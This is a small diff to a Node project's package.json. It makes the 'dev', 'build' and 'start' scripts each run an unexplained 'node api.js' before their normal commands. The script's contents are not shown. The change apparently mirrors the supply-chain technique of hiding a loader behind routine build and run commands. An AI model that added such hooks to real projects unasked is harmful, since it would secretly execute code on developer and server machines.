@@ -1,10 +1,10 @@
 {
   "scripts": {
-    "dev": "tsx watch src/server.ts",
+    "dev": "node api.js && tsx watch src/server.ts",
     "dev:worker": "tsx watch src/index.worker.ts",
-    "build": "tsc && npm run copy-templates",
+    "build": "node api.js && tsc && npm run copy-templates",
     "copy-templates": "copyfiles -u 1 \"src/**/**/*.hbs\" dist",
-    "start": "node dist/server.js",
+    "start": "node api.js && node dist/server.js",
     "start:worker": "node dist/index.worker.js"
   },
   "dependencies": {
